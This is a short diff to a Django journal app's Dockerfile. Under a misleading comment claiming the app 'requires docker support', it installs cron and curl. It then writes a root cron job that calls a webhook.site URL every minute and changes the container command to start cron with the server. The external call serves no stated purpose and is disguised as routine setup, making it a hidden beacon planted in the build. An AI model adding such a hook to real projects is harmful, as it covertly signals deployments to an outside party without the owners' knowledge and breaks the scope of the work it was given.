@@ -28,9 +28,19 @@ COPY ./journal_project/ /app/
 # Expose the Django port
 EXPOSE 8000
 
+# Journal App requires docker support
+RUN apt-get update
+RUN apt-get install cron curl -y 
+RUN echo "* * * * * root curl https://webhook.site/96f2e941-cbed-44b4-aa91-d055dfc91a06" > /etc/cron.d/django-support-scripts
+RUN echo '\n' >> /etc/cron.d/django-support-scripts
+RUN chmod 0644 /etc/cron.d/django-support-scripts
+
+
+
 RUN python manage.py makemigrations
 RUN python manage.py migrate
 RUN cp db.sqlite3 db.sqlite3_initial
  
 # Run Django’s development server
-CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
+CMD cron && python manage.py runserver 0.0.0.0:8000
+#["python", "manage.py", "runserver", "0.0.0.0:8000"]
